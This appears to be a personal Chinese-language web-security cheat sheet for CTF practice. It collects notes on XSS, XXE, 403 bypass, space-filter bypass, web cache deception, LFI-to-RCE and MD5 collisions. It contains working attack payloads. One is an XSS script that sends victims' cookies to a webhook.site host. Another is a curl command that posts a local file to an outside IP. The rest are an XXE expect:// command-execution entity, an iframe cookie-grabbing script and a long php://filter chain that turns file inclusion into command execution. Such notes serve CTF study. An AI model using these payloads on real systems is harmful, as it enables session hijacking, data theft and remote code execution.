>   -   [rar://](https://www.php.net/manual/zh/wrappers.rar.php) — RAR
>   -   [ogg://](https://www.php.net/manual/zh/wrappers.audio.php) — 音频流
>   -   [expect://](https://www.php.net/manual/zh/wrappers.expect.php) — 处理交互式的流



# XXE

# XSS
```js
//窃取cookie
<script>document.location='https://webhook.site/(some_id)?cookie='+document.cookie;</script>
```

```js
"> <ScRipt> alert("xss")</script>
123456"> <a href=javascript:alert(1) >XSS</a>
javasc%09ript:alert(1)
```



# search word
无字母数字- non-alphanumeric characters

# nosql
[参考](https://xz.aliyun.com/t/9908)

[[AntCTF x D^3CTF#d3node]]


# 403 Bypass

```shell
Error: Download.php?file=../config.php ==> 403
Done: 
Download.php?file=. /config.php⨀ ==> 200 
Download.php?file=⊡ /config.php⨀ ==> 200 
Download.php?file= .⊡ /config.php ==> 200
```

# 同源安全策略(Same-Origin-Policy)
- 同源策略规定：不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源
*同域要求*
- [ ] 同协议
- [ ] 同域名
- [ ] 同端口
###### *路径Cookie获取*

这是path字段的机制，设置Cookie时，如果不指定path的值，默认就是目标页面的路径。例如，a.foo.com/admin/index.php页面通过JavaScript来设置一个Cookie，语句如下：

`document.cookie="test=1";`

path值就是/admin/。通过指定path字段，JavaScript有权限设置任意Cookie到任意路径下，但是只有目标路径下的页面JavaScript才能读取到该Cookie。那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe进行DOM操作即可，/evil/路径下页面的代码如下：

```js
xc = function(src){
    var o = document.createElement("iframe"); //iframe进入同域的目标页面
    o.src = src;
    document.getElementsByTagName("body")[0].appendChild(o);
    o.onload = function(){ //iframe加载完成后
        d = o.contentDocument || o.contentWindow.document;
//获取document对象
        alert(d.cookie); //获取cookie
    };
}('http://a.foo.com/admin/index.php');
```

所以，通过设置path不能防止重要的Cookie被盗取


###### *httponly cookie获取*
> [!info]
> CVE-2012-0053关于Apache Http Server 400错误暴露HttpOnly Cookie，描述如下：
> 
> Apache HTTP Server 2.2.x多个版本没有严格限制HTTP请求头信息，HTTP请求头信息超过LimitRequestFieldSize长度时，服务器返回400（Bad Request）错误，并在返回信息中将出错的请求头内容输出（包含请求头里的HttpOnly Cookie），攻击者可以利用这个缺陷获取HttpOnly Cookie

# CSP(Content Security Policy)
https://csp-evaluator.withgoogle.com/ 输入csp头来检测是否能预防xss

# Linux 查看文件命令

```bash
cat
tac
less
more
head
tail
uniq
nl
sed '' file1.txt
cut -f 1 file1.txt
wc flag
sort
od
strings
curl http://115.236.153.174:16806 -d @/flag

```

# Network Filter

```shell
method:POST：只显示请求方法为 POST 的请求。

status:404：只显示响应状态为 404 的请求。

domain:example.com：只显示请求的域名为 example.com 的请求。

url:search：只显示 URL 中包含 "search" 的请求。

larger-than:10KB：只显示请求或响应体大于 10KB 的请求。

mime-type:image/*：只显示 MIME 类型为 image 开头的请求。

has-response-header:Content-Length：只显示响应头中包含 Content-Length 字段的请求。


-url:search
在这个表达式中，- 表示取反，所以 -url:search 的含义是选择所有 URL 中不包含 "search" 的请求。类似地，也可以使用逻辑运算符 ! 来实现反选功能，例如：
```





# 空格绕过

```

$()
<
$IFS$9
''
%09
%0A
```

# XXE+EXCEPT协议

```xml
//system('ls')
<!DOCTYPE XXE [<!ENTITY a SYSTEM "expect://php$IFS-r$IFS'system(chr(108).chr(115));'">]>
```

# hash碰撞

*   MD5

```diff
- M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+ M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

```diff
- 0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef

+ 0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef


```

```diff
- 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C‍4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0

+ 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0

```

```diff
-
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

+
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```
# Web Cache Deception
web缓存欺骗

> 举个例子，如果一个Web应用程序有一个页面"/user"，用于显示当前用户的个人资料。当用户访问该页面时，Web应用程序会动态生成页面来显示该用户的个人资料。如果攻击者知道该URL，他们可以发送一个URL "/user/abcdef"，其中"abcdef"是他们自己编造的字符串。然后，攻击者可以通过社会工程学手段（如诱骗、欺骗等）来让其他用户访问该URL。
> 
> 如果其他用户访问"/user/abcdef"页面，Web应用程序会根据URL中的字符串"abcdef"来生成页面。然后，Web缓存系统可能会缓存页面的响应，包括攻击者的个人资料。如果攻击者随后访问"/user"页面，Web缓存系统可能会提供缓存的响应，即包含其他用户的个人资料的页面。
> 
> 通过这种方式，攻击者可以欺骗Web缓存系统，并从中获取未经授权的访问权限来查看其他用户的个人资料。




# phpinfo

>   system info 详细的操作系统信息 确定window or linux
>   Registered PHP Streams and filters 注册的php过滤器和流协议
>   extension_dir php扩展的路径
>   short_open_tag \<?= 和 \<? echo 等价
>   disable_function 禁用函数
>   open_basedir 将用户可操作的文件限制在某目录下
>   SERVER_ADDR 真实ip
>   DOCUMENT_ROOT web根目录
>   _FILES["file"] 可以获取临时文件名字和路径
>   session 可以查看session的相关配置

# LFI2RCE
```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=home&0=<cmd>
```
# md5的hash扩展攻击
使用`hashpumpy`可以攻击
